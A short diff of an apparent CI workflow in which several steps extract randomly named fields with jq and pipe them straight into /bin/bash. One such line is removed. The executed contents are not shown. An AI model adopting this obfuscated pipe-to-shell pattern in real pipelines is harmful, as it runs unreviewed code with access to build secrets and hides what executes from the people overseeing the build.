@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$ondm93" | jq -r .pb74225 | /bin/bash
           printf '%s' "$osn2" | jq -r .bviih8 | /bin/bash
           echo $i9082 | jq -r .y54461 | /bin/bash
-          echo $n0 | jq -r .yphw8 | /bin/bash
           echo $w542 | jq -r .l53533 | /bin/bash
 
       - name: Archive results
